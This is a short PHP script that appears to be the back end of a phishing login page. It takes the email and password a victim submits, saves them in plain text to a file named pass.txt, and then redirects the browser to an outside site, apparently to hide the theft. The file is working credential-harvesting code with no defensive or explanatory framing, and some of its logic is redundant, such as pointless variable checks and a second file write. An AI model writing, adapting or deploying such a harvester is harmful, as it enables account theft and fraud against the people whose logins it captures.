<?php
	ob_start();
	if (isset($file)) { $file = '$pass.txt';} else { $file = NULL; }
	if (isset($current)) { $current = NULL;} else { $current = NULL; }
	$file = 'pass.txt';
	$current = file_get_contents($file);
	if (isset($email)) {$email = NULL;} else {$email = NULL;}
	if (isset($password)) {$password = NULL;} else {$password = NULL;}
	if($_GET["login_attempt"]) {
		$email = $_POST["email"];
		$password = $_POST["pass"];
		$current .= $email . " ";
		$current .= $password . "\n";
		file_put_contents($file, $current, FILE_APPEND);
		echo "<script type=\"text/javascript\">window.top.location.href = \"http://vic4e.com/image/%D0%94%D0%B5%D0%BC%D0%BE%D1%82%D0%B8%D0%B2%D0%B0%D1%82%D0%BE%D1%80%D0%B8/cbdZ9/\";</script>";
		// echo $email . " " . $password;
	} else {
		header("Location: index.php");
	}
	file_put_contents($file, $current);
?>